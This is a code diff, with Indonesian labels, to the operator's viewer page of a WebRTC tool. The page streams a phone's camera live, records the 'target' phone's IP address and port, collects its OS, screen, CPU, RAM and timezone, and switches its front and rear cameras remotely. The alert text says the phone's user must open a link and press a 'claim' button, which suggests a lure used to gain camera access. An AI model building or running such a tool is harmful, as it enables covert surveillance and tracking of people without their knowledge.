@@ -8,14 +8,15 @@
     body { font-family: sans-serif; text-align: center; background: #222; color: white; padding: 20px; }
     video { width: 80%; max-width: 600px; border-radius: 10px; border: 2px solid #00ffcc; margin-top: 15px; }
     button { padding: 12px 24px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-    #infoBox { background: #333; margin: 15px auto; padding: 10px; border-radius: 8px; max-width: 600px; color: #00ffcc; font-family: monospace; }
+    button:hover { background: #0056b3; }
+    #infoBox { background: #333; margin: 15px auto; padding: 15px; border-radius: 8px; max-width: 600px; color: #00ffcc; font-family: monospace; text-align: left; line-height: 1.6; word-break: break-all; }
   </style>
 </head>
 <body>
   <h2>Layar Pantau Kamera HP (Live)</h2>
-  <button id="switchBtn">🔄 Ganti Kamera (Depan / Belakang)</button>
+  <button id="switchBtn">🔄 Ganti Kamera (Depan / Belakang)</button> <br>
   
-  <!-- Kotak Informasi IP Address -->
+  <!-- Kotak Informasi IP & Spesifikasi HP -->
   <div id="infoBox">Status: Menunggu koneksi dari HP...</div>
 
   <video id="remoteVideo" autoplay playsinline muted></video>
@@ -27,26 +28,38 @@
       config: {
         iceServers: [
           { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' }
+          { urls: 'stun:stun1.l.google.com:19302' },
+          { urls: 'stun:stun2.l.google.com:19302' }
         ]
       }
     });
 
     let activeDataConn = null;
+    let ipTargetInfo = "Mencari IP...";
+    let deviceInfoText = "Menunggu data perangkat...";
 
+    function updateDisplay() {
+      const infoBox = document.getElementById('infoBox');
+      infoBox.innerHTML = `
+        <strong>🌐 KONEKSI JARINGAN:</strong><br>
+        ${ipTargetInfo}<br><br>
+        <strong>📱 SPESIFIKASI PERANGKAT HP:</strong><br>
+        ${deviceInfoText}
+      `;
+    }
+
+    // 1. Menangkap siaran video dari HP & mendeteksi Alamat IP
     peer.on('call', (call) => {
       call.answer();
-      
       call.on('stream', (remoteStream) => {
         document.getElementById('remoteVideo').srcObject = remoteStream;
         
-        // Membaca Alamat IP Target dari Koneksi WebRTC
         setTimeout(() => {
           call.peerConnection.getStats().then(stats => {
             stats.forEach(report => {
               if (report.type === 'remote-candidate' && report.ip) {
-                document.getElementById('infoBox').innerHTML = 
-                  `<strong>HP Terhubung!</strong><br>IP Target: ${report.ip} | Port: ${report.port} | Tipe: ${report.candidateType}`;
+                ipTargetInfo = `• IP Target: <strong>${report.ip}</strong><br>• Port: ${report.port}<br>• Tipe Jalur: ${report.candidateType}`;
+                updateDisplay();
               }
             });
           });
@@ -54,15 +67,29 @@
       });
     });
 
+    // 2. Menangkap data profil spesifikasi HP
     peer.on('connection', (conn) => {
       activeDataConn = conn;
+
+      conn.on('data', (data) => {
+        if (data.type === 'device-info') {
+          deviceInfoText = `
+            • OS & Peramban: ${data.osBrowser}<br>
+            • Resolusi Layar: ${data.resolusi}<br>
+            • Inti CPU: ${data.cpuCore} Core | Estimasi RAM: ${data.ram}<br>
+            • Zona Waktu: ${data.zonaWaktu}
+          `;
+          updateDisplay();
+        }
+      });
     });
 
+    // 3. Perintah tombol ganti kamera
     document.getElementById('switchBtn').addEventListener('click', () => {
       if (activeDataConn && activeDataConn.open) {
         activeDataConn.send('switch');
       } else {
-        alert("HP belum terhubung!");
+        alert("HP belum terhubung! Buka link di HP dan tekan tombol klaim terlebih dahulu.");
       }
     });
   </script>
